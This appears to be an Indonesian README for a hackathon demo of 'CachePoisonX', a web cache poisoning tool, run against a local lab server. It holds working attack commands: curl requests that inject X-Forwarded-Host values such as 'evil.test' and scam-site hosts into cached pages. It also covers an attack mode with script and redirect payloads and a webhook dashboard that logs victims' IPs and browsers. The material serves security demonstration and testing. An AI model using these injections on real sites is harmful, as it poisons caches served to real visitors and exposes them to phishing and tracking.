# Cara Jalanin CachePoisonX

Semua perintah di bawah sudah gw tes. Copy-paste apa adanya.

---

## 0. Persiapan (sekali saja)

```bash
cd ~/hackathon
python3 -c "import requests; print('ok')"    # harus print ok
chmod +x demo.sh
```

Kalau `requests` belum ada:

```bash
pip install --user --break-system-packages requests
```

---

## 1. Nyalakan lab (terminal 1)

Lab itu yang jadi target demo: origin + cache + webhook receiver.
**Biarkan terminal ini tetap jalan** selama demo.

```bash
cd ~/hackathon
python3 lab_cache_origin.py 8899
```

Kalau muncul `OSError: [Errno 98] Address already in use`, berarti sudah ada
yang jalan di port itu. Matikan dulu:

```bash
pkill -f "lab_cache_origin.py 8899"
```

---

## 2. Demo cepat — 1 perintah (terminal 2)

Ini yang paling enak buat depan juri. Satu perintah, keluar semua buktinya.

```bash
cd ~/hackathon
./demo.sh "attacker.evil.test"
```

Yang lu lihat, urut dari atas:

```
1/ curl -I sebelum injeksi        -> X-Cache: MISS
2/ INJECT: kirim header           -> X-Cache: MISS   (response ini disimpan)
3/ curl -I TANPA header (korban)  -> X-Cache: HIT    <- INI BUKTINYA
4/ Verifikasi payload di body     -> payload DITEMUKAN
   HASIL: CACHE BERHASIL DIRACUN
```

Payload bisa diganti:

```bash
./demo.sh "situs-penipu.com"
./demo.sh "situs-penipu.com" /article/berita-123
```

Kalau URL target beda port:

```bash
LAB_URL=http://127.0.0.1:9000 ./demo.sh "evil.test"
```

---

## 3. Perintah manual (kalau juri minta lihat sendiri)

Urutannya penting. Jalankan satu per satu di terminal 2.

```bash
# (a) mulai dari kondisi bersih
curl -s http://127.0.0.1:8899/_cache/clear

# (b) intip dulu -> MISS
curl -sI http://127.0.0.1:8899/article/demo-1 | grep -iE 'x-cache|content-length'

# (c) INJECT pakai GET (jangan pakai -I!)
curl -s -H 'X-Forwarded-Host: evil.test' -o /dev/null \
  http://127.0.0.1:8899/article/demo-1

# (d) request korban TANPA header -> HIT
curl -sI http://127.0.0.1:8899/article/demo-1 | grep -iE 'x-cache|content-length'

# (e) bukti payload beneran tersaji
curl -s http://127.0.0.1:8899/article/demo-1 | grep -o 'evil.test'
```

Hasil yang benar:

| Langkah | X-Cache | Content-Length |
|---|---|---|
| (b) sebelum | MISS | 495 |
| (d) sesudah | **HIT** | **berubah** (mis. 531) |
| (e) body | — | `evil.test` ketemu |

**Kenapa (c) harus GET, bukan `curl -I`:** `HEAD` secara HTTP tidak menyimpan
body. Cache yang benar tidak akan menyimpan apa pun dari request HEAD, jadi
payload tidak pernah masuk. Ini kesalahan paling sering.

---

## 4. Pakai tool-nya (bukan cuma curl)

### 4a. Mode deteksi — "target ini bisa diracunin nggak?"

```bash
cd ~/hackathon/CachePoisonX
python3 main.py -u http://127.0.0.1:8899/article/berita-1 --yes
```

Output akhir:

```
Cache terdeteksi: True
Temuan          : 3
Terbukti poisoning: 3
Laporan         : cachepoisonx_report.json & cachepoisonx_report.html
```

Buka laporannya:

```bash
xdg-open cachepoisonx_report.html     # atau buka manual di browser
```

### 4b. Mode injeksi — tanam payload + ukur sebaran

```bash
cd ~/hackathon/CachePoisonX
curl -s http://127.0.0.1:8899/_cache/clear

python3 main.py -u http://127.0.0.1:8899/article/demo --attack \
  --header X-Forwarded-Host \
  --payload "127.0.0.1:8899/_hook/proof" \
  --victims 5 \
  --hook-api http://127.0.0.1:8899/_events \
  --yes
```

Output akhir:

```
BERHASIL INJECT : 1
Dimuat browser  : 1 (payload di atribut src/href/script)
Korban terkena : 5/5 replay
  - X-Forwarded-Host = 127.0.0.1:8899/_hook/proof [DIMUAT BROWSER]
    jejak cache: MISS -> MISS -> HIT
```

Di bawahnya tool otomatis nyetak blok **"BUKTI MANUAL DI TERMINAL"** — perintah
`curl -I` siap copas. Tinggal salin ke terminal, juri lihat sendiri `HIT`-nya.

### 4c. Bukti callback webhook (opsional, efek paling kuat)

Setelah 4b, buka URL target di browser:

```bash
xdg-open "http://127.0.0.1:8899/article/demo"
```

Terus cek log webhook:

```bash
curl -s http://127.0.0.1:8899/_events | python3 -m json.tool
```

Kalau ada `"count": 1` atau lebih, berarti browser korban benar-benar nembak
server penyerang tanpa disentuh apa pun. Itu bukti eksekusi, bukan cuma
"payload ada di HTML".

### 4d. Dashboard live — pantau webhook real-time

Ini yang paling enak buat demo: buka di browser, biarin kebuka, terus tiap ada
korban yang buka halaman teracuni, barisnya nambah sendiri tanpa reload.

```bash
xdg-open http://127.0.0.1:8899/_monitor
```

Isinya:

- **angka besar** = jumlah request masuk (update tiap 1,5 detik)
- **tabel** = token/path, IP klien, User-Agent, Referer, waktu
- tombol **Kosongkan log**, **Refresh**, **Auto-refresh ON/OFF**

Tiap baris nyatet:

| Kolom | Artinya |
|---|---|
| Token / path | endpoint penyerang yang dipanggil |
| Klien | IP si korban |
| User-Agent | browser korban (Chrome/Firefox/curl) |
| Referer | halaman teracuni yang dia buka |
| Waktu | kapan kejadiannya (UTC) |

Jadi kalau juri nanya "ini beneran kepanggil?", tinggal tunjuk dashboard-nya
sambil bilang "saya buka halaman ini di browser, dan lihat, request-nya masuk
sini sendiri".

Endpoint mentahnya juga bisa dipakai buat otomasi:

```bash
curl -s http://127.0.0.1:8899/_events          # JSON semua hit
curl -s http://127.0.0.1:8899/_events/clear    # kosongkan
```

---

## 5. Opsi yang sering dipakai

| Opsi | Fungsi |
|---|---|
| `--attack` | mode injeksi (default: deteksi) |
| `--header NAMA` | pilih header vektor, boleh diulang |
| `--payload X` | `host` / `webhook` / `script` / `redirect` / `path` / literal |
| `--victims N` | simulasi N korban |
| `--hook-api URL` | verifikasi callback webhook |
| `--buster` | query unik per percobaan (banyak header di 1 URL) |
| `--no-rate-limit` | hilangkan delay 500ms (lab lokal) |
| `--yes` | lewati prompt konfirmasi |
| `-o PREFIX` | nama file laporan |

Lihat semua: `python3 main.py -h`

---

## 6. Kalau ada masalah

**`Address already in use`**
```bash
pkill -f "lab_cache_origin.py 8899"
```

**Hasilnya MISS terus, gak mau HIT**
Cache sudah terisi dari percobaan sebelumnya. Kosongkan dulu:
```bash
curl -s http://127.0.0.1:8899/_cache/clear
```

**`X-Cache` gak muncul sama sekali**
Target gak punya cache layer. Ini yang bakal kejadian kalau demo ke DVWA polos.
Cache poisoning butuh cache — pastikan ada nginx/CDN di depan aplikasi.

**`ModuleNotFoundError: requests`**
```bash
pip install --user --break-system-packages requests
```

**Laporan HTML kosong / gak ada temuan**
Berarti gak ada yang lolos verifikasi. Cek output terminal: kalau semua
`IGNORED`, header-nya diabaikan target. Kalau `CACHE_WARM`, cache sudah terisi —
kosongkan dulu.

---

## 7. Urutan demo yang gw saranin (5 menit)

1. **Buka lab** (terminal 1) — tunjukin ini target demo.
2. **`./demo.sh "attacker.evil.test"`** — biar juri lihat `MISS -> HIT` langsung.
3. **Ulangi manual pakai curl** kalau juri minta lihat sendiri (bagian 3).
4. **Buka `/_monitor`** di tab lain — dashboard webhook, biarin kebuka.
5. **Buka halaman teracuni di browser** — tunjukin dashboard-nya nambah sendiri.
6. **Buka laporan HTML** — tunjukin timeline + cache key matrix.
7. **Tutup dengan batasan**: tool ini belum nangkep poisoning lewat
   path/parameter unkeyed, dan butuh cache layer di target.

Jangan skip langkah 7. Juri lebih respect tim yang tau batas tool-nya.